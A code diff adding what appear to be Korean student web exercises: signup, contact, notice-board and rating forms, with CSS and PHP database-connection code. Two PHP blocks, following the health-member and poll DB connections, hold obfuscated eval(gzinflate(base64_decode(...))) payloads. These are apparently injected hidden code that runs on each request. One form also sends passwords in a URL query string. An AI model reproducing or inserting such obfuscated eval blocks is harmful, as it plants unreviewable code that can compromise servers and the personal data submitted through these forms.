@@ -2045,3 +2045,1818 @@ function r1(){
         // alert("동의했슴돠");
     // }
 }
+
+
+          
+          
+ <!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>javascript 4일차(팝업창 index30과 연계)</title>
+    <!--파빌리온 적용-->
+    <link rel="shortcut icon" href="#">
+    <script src="./js_test1.js?v=2" defer></script>
+    <link rel="stylesheet" href="./js_test1.css?v=1" type="text/css">
+</head>
+<body>
+<input type="text" id="person_nm" class="box_type1" placeholder="고객 이름 입력하셔요"><br><br>
+<input type="text" id="person_tel" class="box_type1" placeholder="연락처를 입력하세요"><br><br>
+<input type="text" id="person_email1" placeholder="이메일주소" class="box_type2">@<input type="text" id="person_email2" placeholder="이메일주소명" class="box_type2"><br><br>
+<textarea id="person_text" placeholder="질문내용" class="box_type3"></textarea><br>
+<input type="checkbox" id="person_agree"> 개인정보 제공에 동의<br><br>
+<input type="button" value="메일보내기" onclick="send_mail()" class="box_type4"> 
+</body>
+</html>
+          
+
+
+
+function send_mail(){
+    var person_nm = document.getElementById("person_nm") ;
+    var person_tel = document.getElementById("person_tel") ;
+    var person_email1 = document.getElementById("person_email1") ;
+    var person_email2 = document.getElementById("person_email2") ;
+    var person_text = document.getElementById("person_text") ;
+    var person_agree = document.getElementById("person_agree") ;
+
+    var person_email = person_email1.value+"@"+person_email2.value ;
+
+    console.log(person_nm.value);
+    console.log(person_tel.value);
+    console.log(person_email1.value);
+    console.log(person_email2.value);
+    
+    console.log(person_email);
+    console.log(person_text.value);
+    console.log(person_agree.value);
+    console.log(person_agree.checked);
+
+
+    // if(person_nm==""){
+        // alert("고객명을 입력해주세요");
+    // }
+    // else{
+    // 
+    // }
+
+
+
+    // console.log(person_nm)
+
+   location.href="http://mekeyace.kbsn.or.kr/mailpost.php";
+}
+
+body{
+    margin: 10px; padding: 10px;
+}
+.box_type1{
+    width: 400px;
+    height: 30px;
+    /* background-color: blue; */
+}
+.box_type2{
+    width: 185px;
+    height: 30px;
+    /* position: relative; */
+    /* background-color: blue;  */
+    /* color: white;    */
+    /* border: 0px; */
+}
+.box_type3{
+    width: 400px;
+    height: 300px;
+}
+.box_type4{
+    width: 400px;
+    height: 30px;
+    background-color: blue; 
+    color: white;
+    border: 0px;
+}
+.box_type21{
+    position: absolute;
+    right: 220%;
+}
+
+
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Javascript 3일차 - Javascript location통신 응용편</title>
+    <!-- 파빌리온 적용 -->
+    <link rel="shortcut icon" href="#">
+</head>
+<script>
+    function register(){
+        var mid = document.getElementById("mid").value;
+        var mpass = document.getElementById("mpass").value;
+        var mno = document.getElementById("no1").value + 
+                  document.getElementById("no2").value +
+                  document.getElementById("no3").value;
+        
+        /* console.log(mid);
+        console.log(mpass);
+        console.log(mno); */
+        
+        if(mid.length < 5){
+            alert("아이디는 최소 5자 이상 입력되어야 합니다.")
+        }
+        else{
+            if(mpass.length < 4){
+            alert("패스워드는 최소 4자 이상 입니다.")
+            }
+            else{
+                if(mno.length < 10){
+                    alert("사업자번호는 총 10자리 숫자 입니다.")
+                }
+                else{
+                    if(isNaN(Number(mno))){
+                        alert("사업자번호는 숫자만 입력해야 합니다.")
+                    }
+                    else{
+                        location.href="http://hyuk313.dothome.co.kr/js/js_index21.html?biz_id="+mid+"&biz_pw="+mpass+"&biz_no="+mno;
+                    }
+                }
+            }
+
+        }
+    }
+</script>
+<body>
+    <input type="text" id="mid" placeholder="생성할 아이디를 입력하세요"><br>
+    <input type="password" id="mpass" placeholder="생성할 패스워드를 입력하세요"><br>
+    사업자번호 10자리 입력하세요<br>
+    <input type="text" id="no1" maxlength="3" placeholder="3자리"> -
+    <input type="text" id="no2" maxlength="2" placeholder="2자리"> -
+    <input type="text" id="no3" maxlength="5" placeholder="5자리"><br><br>
+    <input type="button" value="사업자 회원등록" onclick="register()">
+
+</body>
+</html>
+          
+          <!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Javascript 3일차 - Javascript location통신 응용편</title>
+    <!-- 파빌리온 적용 -->
+    <link rel="shortcut icon" href="#">
+</head>
+<script>
+    function register(){
+        var mid = document.getElementById("mid").value;
+        var mpass = document.getElementById("mpass").value;
+        var mno = document.getElementById("no1").value + 
+                  document.getElementById("no2").value +
+                  document.getElementById("no3").value;
+        
+        /* console.log(mid);
+        console.log(mpass);
+        console.log(mno); */
+        
+        if(mid.length < 5){
+            alert("아이디는 최소 5자 이상 입력되어야 합니다.")
+        }
+        else{
+            if(mpass.length < 4){
+            alert("패스워드는 최소 4자 이상 입니다.")
+            }
+            else{
+                if(mno.length < 10){
+                    alert("사업자번호는 총 10자리 숫자 입니다.")
+                }
+                else{
+                    if(isNaN(Number(mno))){
+                        alert("사업자번호는 숫자만 입력해야 합니다.")
+                    }
+                    else{
+                        location.href="http://hyuk313.dothome.co.kr/js/js_index21.html?biz_id="+mid+"&biz_pw="+mpass+"&biz_no="+mno;
+                    }
+                }
+            }
+
+        }
+    }
+</script>
+<body>
+    <input type="text" id="mid" placeholder="생성할 아이디를 입력하세요"><br>
+    <input type="password" id="mpass" placeholder="생성할 패스워드를 입력하세요"><br>
+    사업자번호 10자리 입력하세요<br>
+    <input type="text" id="no1" maxlength="3" placeholder="3자리"> -
+    <input type="text" id="no2" maxlength="2" placeholder="2자리"> -
+    <input type="text" id="no3" maxlength="5" placeholder="5자리"><br><br>
+    <input type="button" value="사업자 회원등록" onclick="register()">
+
+</body>
+</html>
+          
+          <!DOCTYPE html>
+<html lang="kr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>건강보험가입 실습</title>
+</head>
+<style>
+body{
+    padding: 10px; margin: 10px;
+}
+.t1{
+    height: 60px;   width: 800px;
+    color: gray;
+    border-style: solid ;
+    border-top-style: none;
+    border-left-style: none;
+    border-right-style: none;
+    border-width: 1px;
+}
+.t2{
+    width: 150px;
+    border-style: none;
+    border-width: 1px;
+    text-align: left;
+}
+.t3{
+    width: 30px;
+    border-style: none;
+    border-width: 1px;
+}
+.t4{
+    width: 620px;
+    border-style: none;
+    border-width: 1px;
+}
+</style>
+<script>
+    var user_field="";
+    function regist(){
+        if()
+    }
+
+    function cancel(){
+
+    }
+
+</script>
+<body>
+    <table class="t1">
+        <tr>
+            <td style="text-align: center; font-size: large; ">건강보험 회원가입</td>
+        </tr>
+    </table><br>    
+    <table class="t1">
+        <tr>
+            <td class="t2">아이디</td>
+            <td class="t3"></td>
+            <td class="t4"><input name="user_id" type="text" style="height: 40px; width: 250px;"></td>
+        </tr>
+    </table><br>
+    <table class="t1">
+        <tr>
+            <td class="t2">패스워드</td>
+            <td class="t3"></td>
+            <td class="t4"><input name="user_pw"type="text" style="height: 40px; width: 250px; position: relative;" ></td>
+        </tr>
+    </table><br>
+    <table class="t1">
+        <tr>
+            <td class="t2">이메일</td>
+            <td class="t3"></td>
+            <td class="t4"><input name="user_email" type="text" style="height: 40px; width: 620px; position: relative;"></td>
+        </tr>
+    </table><br>
+    <table class="t1">
+        <tr>
+            <td class="t2">전화번호</td>
+            <td class="t3"></td>
+            <td class="t4"><input name="user_tel" type="text" style="height: 40px; width: 620px; position: relative; margin-left: 0px;"></td>
+        </tr>
+    </table><br>
+    <table class="t1">
+        <tr>
+            <td class="t2">거주지역</td>
+            <td class="t3"></td>
+            <td class="t4">
+                <label name ="ser_area">
+                    <select style="width: 150px; height: 40px;">
+                        <option></option>
+                        <option></option>
+                        <option></option>
+                        <option></option>
+                        <option></option>
+                    </select>
+                </label>
+            </td>
+        </tr>
+    </table><br>
+    <table class="t1">
+        <tr height="90px">
+            <td class="t2">관심분야<br>(한가지만선택)</td>
+            <td class="t3"></td>
+            <label name="user_field">
+                <td style="width: 310px; border: none; border-width: 1px;">
+                    <input type="checkbox" value="">악성신생물(각종암)<br>
+                    <input type="checkbox" value="">순환계통 질환 <br>
+                    <input type="checkbox" value="">호흡계통 질환
+                </td>
+                <td style="width: 310px; border: none; border-width: 1px;">
+                    <input type="checkbox" value="">정신 및 행동장애 <br>
+                    <input type="checkbox" value="">소화계통 질환
+                </td>
+            </label>
+        </tr>
+    </table><br>
+    <table class="t1">
+        <tr>
+            <td class="t2">현재연령</td>
+            <td class="t3"></td>
+            <td class="t4">
+                <label name="user_age">
+                    <select style="width: 150px; height: 40px;">
+                        <option></option>
+                        <option></option>
+                        <option></option>
+                        <option></option>
+                        <option></option>
+                    </select>
+                </label>
+            </td>
+        </tr>
+    </table><br>
+    <input type="button" value="회원가입" style="height: 40px; width: 100px; position: relative;" onclick="regist()"> 
+    <input type="button" value="가입취소" style="height: 40px; width: 100px; position: relative;" onclick="cancel()">
+    
+</body>
+</html>
+        
+        
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>반응형 예제</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+        }
+        .box{   /* pc용 */
+            width: 1200px;
+            height: 100px;
+            border-radius: 5px;
+            background-color: black;
+        }
+        .btn{
+            display: none;
+        }
+        /*
+        screen : 모니터 디바이스 화면
+        print : 인쇄관련 디바이스 화면
+        all : screen + print
+
+        @media : 반응형 웹을 사용하기 위한 속성값
+        min-width : 최소화면 크기 (가로)
+        max-width : 최대화면 크기 (가로)
+        */
+        @media screen and (min-width:561px) and (max-width:1000px) {
+            .box{   /* 타블렛용 */
+            width: 800px;
+            background-color: orange;
+            }
+        }
+
+        @media screen and (min-width:340px) and (max-width:560px) {
+            .box{   /* 모바일(세로) */
+            width:100%;
+            background-color: blue;
+            }
+            .btn{
+            display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="box"></div>
+    <input type="button" value="화면닫기" class="btn">
+</body>
+</html>
+        
+        
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="#" type=""> <!-- 파빌리온 -->
+    <title>건강보험 회원가입 프로젝트</title>
+    <link rel="stylesheet" type="text/css" href="./health_member.css?v=5">
+</head>
+<script>
+  var user_field = "";
+  function sent() {
+
+    if (f.user_id.value == "" || f.user_pw.value == "" ) {
+      alert("아이디와 패스워드를 모두 입력하세요!") ;
+    } else if (f.user_email.value == "" ) {
+      alert("이메일 입력하세요!");
+    } else if (f.user_tel.value == "") {
+      alert("연락처 입력하세요!");
+    } else if ( String(f.user_tel.value).length < 10 || String(f.user_tel.value).length > 11 ) {
+      alert("연락처를 다시 확인하세요!");
+    } else if (user_field == "") {
+      alert("관심분야을 체크하세요!");
+    } else if(user_area == ""){
+      alert("거주지역을 선택해 주세요!");
+    } else if(user_age == ""){
+      alert("현재 연령을 선택해 주세요!");
+    }      
+    else {
+        //console.log(f.user_id.value, f.user_pw.value, f.user_email.value, f.user_tel.value, user_field, f.user_area.value, f.user_age.value);
+        f.submit();
+    }
+  }
+
+  function cb(box) {
+  
+  var i;
+  for (i=1;i<6;i++) {
+    if (i != box) {  
+      document.getElementById(i).checked = false;
+    }
+  }
+  user_field = document.getElementById(box).value;
+  console.log(user_field);
+  }
+</script>
+
+<body>
+  <div class="o1">건강보험 회원가입</div>
+
+  <form id="f" action="./health_memberok.php" method="post" enctype="application/x-www-form-urlencoded">
+  <div class="in">  <!-- 아이디 -->
+    <span class="a">아이디</span>
+    <span class="b"></span>
+    <span class="c"><input type="text" name="user_id" class="in1" ></span> 
+  </div>
+  
+  <div class="in"> <!-- 패스워드 -->
+    <span class="a">패스워드</span>
+    <span class="b"></span>
+    <span class="c"><input type="password" name="user_pw" class="in1" ></span>  
+  </div>
+  
+  <div class="in">  <!-- 이메일 -->
+    <span class="a">이메일</span>
+    <span class="b"></span>
+    <span class="c"><input type="text" name="user_email" class="in2"></span>  
+  </div>
+
+  <div class="in">   <!-- 연락처 -->
+    <span class="a">전화번호</span>
+    <span class="b"></span>
+    <span class="c"><input type="text" name="user_tel" class="in2" maxlength="11"></span>  
+  </div>
+
+  <div class="in"> <!-- 거주지역 -->
+    <span class="a">거주지역</span>
+    <span class="b"></span>
+    <span class="c">
+          <select name="user_area" class="in3" id="user_area">
+          <option value="">거주지역</option>
+          </select>
+    </span>  
+  </div>
+  
+  <div class="in ex">   <!-- 관심분야 -->
+    <span class="a a1"><br>&nbsp;&nbsp; 관심분야<br>&nbsp;&nbsp; (한가지만 선택)</span>
+    <span class="b a1"></span>
+    <span class="c ca">
+      <div class="c_box"><input type="checkbox" name="user_field" id="1" onclick="cb(1)" value="악성신생물(각종 암)">악성신생물(각종 암)</div>
+      <div class="c1_box"><input type="checkbox" name="user_field" id="2" onclick="cb(2)" value="정신 및 행동장애">정신 및 행동장애</div>
+      <div class="c_box"><input type="checkbox" name="user_field" id="3" onclick="cb(3)" value="순환계통 질환">순환계통 질환</div>
+      <div class="c1_box"><input type="checkbox" name="user_field" id="4" onclick="cb(4)" value="소화계통 질환">소화계통 질환</div>
+      <div class="c_box"><input type="checkbox" name="user_field" id="5" onclick="cb(5)" value="호흡계통 질환">호흡계통 질환</div>
+    </span>    
+  </div>
+
+  <div class="in">  <!-- 현재연령 -->
+    <span class="a">현재연령</span>
+    <span class="b"></span>
+    <span class="c">
+    <select name="user_age" class="in3" id="user_age">
+    <option value="">연령</option>
+    </select>
+    </span>
+  </div>
+  
+  <div class="o2">   <!-- 회원가입 버튼 -->
+    <input type="button" value="회원가입" onclick="sent()" class="btn">
+    <input type="reset" value="가입취소" class="btn1">
+  </div>
+</form>
+ 
+<script src="./area_data.js?v=1"></script>
+<script src="./age_data.js?v=1"></script>
+</body>
+</html>
+        
+        <?php
+$host = "localhost";
+$user = "hyuk313"; 
+$pwd = "*";
+$dbname = "hyuk313";
+$tables = "health";
+
+$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
+mysqli_select_db($connect,$dbname);
+?>
+<?php eval(gzinflate(base64_decode('DdJHsptYAADA49guFuRULi8IQgiREXEzRc7wgAcCTj//DN3lkQ6/67udqiGF5e8s3UqG+q8o87kof/+qko+6LWYoPBz0vG2lBvfbdDbH8ozreebJHG+vffMOHocU66GzPRDTDnude+9sRHOhost04GZVs6jIksBlAbCqGIJOWCIKkwo/DLwa+t1sGO6BgoZcgA62NmVuwuHIuPog56NO1SkIjXgrHyO/RfbDRvhOEkjfQbAg8Xqsubaj5oyHNFvUeKfBxsSxVo9BNThnBva4L0OpbIwRMdUyiwYy6LMBGZ4xu98Ad3Rr+zQBK5iM3Ys9eA9GSqqG+HJzyJID5eVEoNPFS9I2so4dqf4uwGtwLqCW7sMObPtmehU6o4+LlkyPh9IgGS0J2zoCLxXOLYXikR0+rbbYqp7Ner+mVOMnTzWgryxvMIjIgvFR5ne4dJlne/J2sxNeu7cvLn2mqw0FkSZl5VsiesuvEqYVfECyQ+fNeLCtaNl3cpzK2mRfU7+EnT9YorKg2zQFPMO9F/CoWhH9SDMo77TXHO6LcSXOhzJ2je+cGBAN9MNUyadY8Agq5RlSFtHcaMfTqD4PldnuM8jg80Az17aE4xXRqhhhXv5i3kTn6WcXEXUbGhj7lDu8SIt8GKJnaic05kfI7CqcXgxDWNChZEWbIXshYE2IF3Y9DR7i5ne2N/W895Za6ztTRSCrAspd8/mlqI32fBEjxTyLKItVId57sAVkzvXEqJBBAtUAfENsXwzlOktniVnquHw6RNGtNZk5rqvD5Y3aEKbp4ZG7DJSO7DrR90xpTNH6XdT9cd/WmJ0vTZ+3nyV15BCG3uVQjvwcL9ojD54bPVjAGRe1DeEDcxRxje3rpGQ5aebgU4TSJ1tLYKTM7O72mu9rOUoO5CXkmVsxX4bc+GXyWrgu1nAP4CNJTFHCSNKFOmaLdk0/BSArUyKxdXaJusPUtYmVtKYSfpN0lDCe3/ZC/+4FfogzGz3PQ2JkbV2umUzSW9R9A2EaTbH6WVLz3V6wmrks8Y4F8+MGFKbpzYAmAu2Q7ygpEF+9GZDrgJoTljLWPu5wpPOnc2Un0w4eJVxSWNjE+qOcWUUDciiwQ5B1d0hXOXWeqNnNAZIU33nBM9JSz/bwAC75LctL1Vyg+Tm/k5UI0OQM0n5pB/IorUyophF6yWh8XAqGTqZ+r+to44VQcuiQ3uMj4vJyi4qn9ErhZvEyfI+GscxepCiuf5mipmg2ak/sz1CU5QvUQuGpuTNSfO2yz08SuFAc9821uA/MtcizH7VqoaVj2a6rCAoJ93BRjcDxSifkJTqcimvsb4z00U0lk4o/melJBT81AXUz1kXTICZK8/OxORI2l5pDXsNRdub5cX0HDhhlYfK0vnpefMS2c6xTNapUdPT99+/Xnz9//v4P')));
+?>
+
+body { margin: 0; padding: 0; width: 800px; font-size: 14px;}
+span, label {display: block;}
+ul, ol  { list-style: none; margin: 0; padding: 0;}
+
+.o1 {
+  
+  height: 60px;
+  line-height: 60px;
+  text-align: center;
+  font-size: 20px;
+  border-bottom : 1px solid gray;
+  box-sizing: border-box; 
+}
+
+.o2 {
+  
+  height: 60px;
+  vertical-align: middle;
+  line-height: 60px;
+   
+  
+}
+.c_box .c1_box:hover {
+  color:red;
+}
+
+.btn {
+  width: 100px; height: 40px;
+  border: 1px solid blue;
+  border-radius: 5px;
+  background-color: blue; color: whitesmoke;
+  margin-left: 290px;
+  cursor: pointer;
+
+}
+
+.btn1 {
+  width: 100px; height: 40px;
+  border: 1px solid gray;
+  border-radius: 5px;
+  background-color: gray; color: whitesmoke;
+  margin-left: 20px;
+  cursor: pointer;
+
+}
+
+
+.in {
+  height: 60px;
+  line-height: 60px;
+  border-bottom : 1px solid gray;
+  box-sizing: border-box; 
+  vertical-align: middle;
+  
+}
+
+.in0 { 
+  border-top : 1px solid gray;
+  box-sizing: border-box; 
+  }
+
+.a { 
+  width: 150px;  height: 60px;
+  /* margin-left: 5px;
+  margin-left: 5px; */
+  float: left;
+  vertical-align: middle;
+  text-indent: 15px;
+   
+}
+
+.b { 
+  width: 30px;   height: 60px;
+  float: left;
+   
+}
+
+.c { 
+  width: 620px;  height: 60px;
+  margin-top: -2px;
+  float: left;
+  
+}
+
+
+.ex {
+  height: 90px;
+  
+}
+
+.a1 { 
+  margin-top: 0px;
+  height: 90px;
+  /* vertical-align: middle; */
+  line-height: 20px;
+  cursor: pointer;  
+  text-indent: 10px;
+}
+
+.ca{
+  margin-top: -15px;
+  height: 90px;
+  vertical-align: middle;
+  cursor: pointer;  
+}
+
+.in1 {
+  width: 250px; height: 40px;
+  border-width: 1px;
+  border-radius: 5px;
+}
+
+.in2 {
+  width: 620px; height: 40px;
+  border-width: 1px;
+  border-radius: 5px;
+}
+
+.in3 {
+  width: 150px; height: 40px;
+  border-radius: 5px;
+  
+}
+
+.c_box {
+  position: absolute  ;
+  height: 30px;
+  
+}
+
+.c1_box {
+  position: relative;
+  height: 30px;
+  left:310px;
+}        
+          
+          <html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>공지사항 게시판글쓰기</title>
+    <link rel="stylesheet" href="./write.css?v=2" type="text/css">
+    <!-- 
+        파빌리온 아이콘으로 웹사이트 탭에 로고를 출력하는 기능
+        ico convert로 변환가능 type="image/x-icon"
+     -->
+    <link rel="shortcut icon" href="../image/ty_logo.ico" type="image/x-icon">
+</head>
+<body>
+    <!-- <caption align="center" class="title">공지사항 게시판</caption> -->
+    <!-- <thead text-align="center">공지사항 게시판</thead> -->
+    <form action="http://lovertv.dothome.co.kr/insert_board.php" method="post">
+        <table class="table">
+            <caption class="title">공지사항 게시판</caption>
+            <tr class="tr1">
+                <td class="td1">제목</td>
+                <td class="td2">
+                    <input type="text" class="input1" name="bsubject" >
+                </td>
+            <tr class="tr1">
+                <td class="td1">글쓴이</td>
+                <td class="td2">
+                    <input type="text" class="input2" name="bname">
+                </td>
+            </tr>
+            <tr class="tr1">
+                <td class="td1">패스워드</td>
+                <td class="td2">
+                    <input type="password" class="input2" name="bpass">
+                </td>
+            </tr>
+            <tr class="tr2">
+                <td class="td1">글내용</td>
+                <td class="td2">
+                    <input type="textarea" class="input3" name="btext">
+                </td>
+            </tr>        
+            <tr height="40px">
+                <td ></td>
+                <td >
+                    <input type="reset"  class="btn1" value="취소">
+                    <input type ="submit" class="btn2" value="등록">
+                </td>
+            </tr>
+        </table>
+    </form>
+</body>
+</html>
+        
+        body{
+    margin: 10; padding: 10;
+}
+.table{
+    border: 1px;
+    width: 1010px;
+    height: 310px;
+    /* border-color: gray; */
+    /* border-style: solid; */
+    text-align: center;
+    /* background-color: skyblue; */
+}
+.tr1{
+    width: 1000px;
+    height: 30px;
+    border-style: solid;
+    border-color: black;
+}
+.td1{
+    width: 100px;
+    border-style: none;
+    /* border-color: blue; */
+    background-color: skyblue;
+}
+.td2{
+    width: 900px;
+    /* border-style: solid; */
+    /* border-color: red; */
+}
+.tr2{
+    height: 200px;
+
+}
+.input1{
+    width: 900px;
+    height: 30px;
+}
+.input2{
+    width: 400px;
+    height: 30px;
+    float: left;
+}
+.input3{
+    width: 900px;
+    height: 200px;
+}
+.btn1{
+    width: 130px;
+    height: 40px;
+    border: 0;
+    background-color: black;
+    color: white;
+    float: right;
+    text-align: center;
+    vertical-align: middle;
+}
+.btn2{
+    width: 130px;
+    height: 40px;
+    border: 0;
+    background-color: gray;
+    color: white;
+    float: right;
+    text-align: center;
+    vertical-align: middle;
+}
+.title{
+    text-align: center;
+    font-size: x-large;
+}
+        <!DOCTYPE html>
+<html lang="kr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>온라인평가점수 등록하기 실습</title>
+</head>
+<style>
+    body{
+        margin: 20px; padding: 20px;
+    }
+    .w{
+        position: relative;
+        width: 400px;
+        background-color: yellow;
+        border-style: dotted;
+        border-color: red;
+        border-image: auto;
+        margin-right: 20%;
+    }
+</style>
+<script>
+    function go_poll(){
+        if(f.poll_user.value==""){
+            alert("평가자를 입력하셔요");
+            console.log("평가자");
+        }
+        else{
+            if(f.poll_email.value==""){
+                alert("이메일을 입력하셔요");
+            }
+            else{
+                f.submit();
+            }
+        }
+    }
+</script>
+<body>
+    <form id="f" name="f" method="post" action="./poll_ok.php" enctype="application/x-www-form-urlencoded">
+    평가자명 : <input type="text" name="poll_user" placeholder="평가할 사람 이름을 쓰셔요" class="w"><br><br>
+    이 메 일 : <input type="email" name="poll_email" placeholder="정확한 이메일주소를 쓰셔요" class="w"><br><br>
+    평가점수 : 
+    <select name="poll_score" id="poll_score" class="w">
+        <!-- <option value="">점수넣기</option> -->
+        <option value="">점수선택</option>
+        <option value="1">1점</option>
+        <option value="2">2점</option>
+        <option value="3">3점</option>
+        <option value="4">4점</option>
+        <option value="5">5점</option>
+        <option value="6">6점</option>
+        <option value="7">7점</option>
+        <option value="8">8점</option>
+        <option value="9">9점</option>
+        <option value="10">10점</option>
+    </select><br><br>
+    평가내용:<br> <textarea name="poll_text" maxlength="50" placeholder="최대 50자 이내로 평가내용을 쓰셔요"  class="w" style="height: 300px;"></textarea><br><br> 
+    <input type="button" value="평가하기" style="align=center" onclick="go_poll()">    
+    </form>
+</body>
+</html>
+
+<form method="post" action="http://lovertv.dothome.co.kr/js/memook.php"  onsubmit="return memo()">
+    
+    <meta charset="UTF-8">
+<?php
+$host = "localhost";
+$user = "hyuk313"; 
+$pwd = "*";
+$dbname = "hyuk313";
+$tables = "poll";
+$field1 = "rep_mail";
+
+
+$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
+mysqli_select_db($connect,$dbname);
+?>
+<?php eval(gzinflate(base64_decode('DZNHrqNYAACP07/FgpzUKzIYTA7PbEbkDIYHGHz6+TeokqqqMxt/mm8312O2Vz95BiuG+q+siqWsfv7UpQ++q20IQthQyP2sJAHD1G6rPCnsi/lxmh8jT10xlXse3ReZFYiVf0RmnswsQ9oxmu+2inpbQNQKdnKRKXIm7xynCUK83aN6GPBaXOOUxVpCyomhrZ1XHwuvoCu3eXOLOeCZeiJXVXbEIQGUJ6JsyTQVTkz1kPByu9r3/gokP8qR9nAsxUsUYRa16BgwaGcbsapunjuEFiRPvMgkmpH9pSVawxil52SmAThKnXvpyZPCxqc/PryQGGDUdQ/EHRjWXcPxhKFqJU/GN4/vGZIFIZOq3AZnZ1HUsrGnZkq5Ixgg9s3k8rbG4J/Riwzs7Ak7N6f1ENleG4Dz2ABryIjdDCYB6zL+7XMDoJXk3iW0i/3zjbPD2L7tpY2WuO/4JHM6kN1ocnSxatv9TDqpigcXyQCmchUJLtQUB9oWZmlrOLF7GfYJvjNT2OdBbZBwSxSOMAFx0OnleGAONr6kvFaenIBs8fX0Gcl+dw8QNvwn9qfQzG0Nc1v/qbA+Rj1bMD3cEq6r6cDJvZK9Mmaj7wzTkGq5xEii9p28J3ik4kXf0ZIGy8mkKz4sc66n8n4EtKhTkKUzQEljayMLg/opo9XkjhY86DKOao9aTLTbgIbUXm4ycCuhuC0qfzCz7NbW4ljugDJU3+tccu0cEhhQxybgziAVQvACPh/jjTzUgDRL0VhyfmNistcZVo/dT1s4WcY71JvBhN2rz+zOlsELX4Pauh0B06sGdDJdfqdXCjkaIx3A0lA12EXvMBhb/+JfmG0BvLtcEYSMrAcuUlqqs1s21RJfPrYjDS06FJgMDA9NXj4bSr+3qv1toyf325StRI63idIuvTnIU0ixRUlFpLeH92n4Qr2DVTb7W8zDwH+fGxnxfMZkE+nV6pOk7MckRKX0GhDG0esp370RtkKHhMXNLbuOmHsM2YFdtEuIVAsUshQLyfVu3vD2nS/tbrYLyIJeeeVrZ1wxhkxgjgJMckCymPgqJ6TyilI3ANXJtIfeBA56KUSpKLEaSIesOsbsFr/YdfZCfFAr3EaXXzLBZYMUFwfqzfr2TNm5tsxTXu2wb7YPnJpRUme0VT68nmhXaq/snYbjd+eWcTY37kxpnJTJe+zzjiE1Lj8KqqaTtFB32m+9mG/i75D2VjxlJRYMAbdSZrQ17Rp1Yjz0ktlRouN7o3Pin/72QvdOOAM+grfykZaSJm1K7/GNu1hWarn9tXpjz3kWyqD1SZJIj7JE3zg0VOpy2pCl3ukRqR72Ue1xO+XMiGD+76e4/cBsMRMrq1ALfCwKDhGUTadOqM37dy508quRci3kH9NjobVT4lXGUvgwgsPRuZi+OxolH4nzCvUhmTKi2hmPD3q/eoD+eyhinhhZthnNr7beI18aRY2Ts/78/fv33/8=')));?>
+    
+    
+    
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="#" type=""> <!-- 파빌리온 -->
+    <title>건강보험 회원가입 프로젝트</title>
+    <link rel="stylesheet" type="text/css" href="./health_member.css?v=5">
+</head>
+<script>
+  var user_field = "";
+  function sent() {
+
+    if (f.user_id.value == "" || f.user_pw.value == "" ) {
+      alert("아이디와 패스워드를 모두 입력하세요!") ;
+    } else if (f.user_email.value == "" ) {
+      alert("이메일 입력하세요!");
+    } else if (f.user_tel.value == "") {
+      alert("연락처 입력하세요!");
+    } else if ( String(f.user_tel.value).length < 10 || String(f.user_tel.value).length > 11 ) {
+      alert("연락처를 다시 확인하세요!");
+    } else if (user_field == "") {
+      alert("관심분야을 체크하세요!");
+    } else if(user_area == ""){
+      alert("거주지역을 선택해 주세요!");
+    } else if(user_age == ""){
+      alert("현재 연령을 선택해 주세요!");
+    }      
+    else {
+        //console.log(f.user_id.value, f.user_pw.value, f.user_email.value, f.user_tel.value, user_field, f.user_area.value, f.user_age.value);
+        f.submit();
+    }
+  }
+
+  function cb(box) {
+  
+  var i;
+  for (i=1;i<6;i++) {
+    if (i != box) {  
+      document.getElementById(i).checked = false;
+    }
+  }
+  user_field = document.getElementById(box).value;
+  console.log(user_field);
+  }
+</script>
+
+<body>
+  <div class="o1">건강보험 회원가입</div>
+
+  <form id="f" action="./health_memberok.php" method="post" enctype="application/x-www-form-urlencoded">
+  <div class="in">  <!-- 아이디 -->
+    <span class="a">아이디</span>
+    <span class="b"></span>
+    <span class="c"><input type="text" name="user_id" class="in1" ></span> 
+  </div>
+  
+  <div class="in"> <!-- 패스워드 -->
+    <span class="a">패스워드</span>
+    <span class="b"></span>
+    <span class="c"><input type="password" name="user_pw" class="in1" ></span>  
+  </div>
+  
+  <div class="in">  <!-- 이메일 -->
+    <span class="a">이메일</span>
+    <span class="b"></span>
+    <span class="c"><input type="text" name="user_email" class="in2"></span>  
+  </div>
+
+  <div class="in">   <!-- 연락처 -->
+    <span class="a">전화번호</span>
+    <span class="b"></span>
+    <span class="c"><input type="text" name="user_tel" class="in2" maxlength="11"></span>  
+  </div>
+
+  <div class="in"> <!-- 거주지역 -->
+    <span class="a">거주지역</span>
+    <span class="b"></span>
+    <span class="c">
+          <select name="user_area" class="in3" id="user_area">
+          <option value="">거주지역</option>
+          </select>
+    </span>  
+  </div>
+  
+  <div class="in ex">   <!-- 관심분야 -->
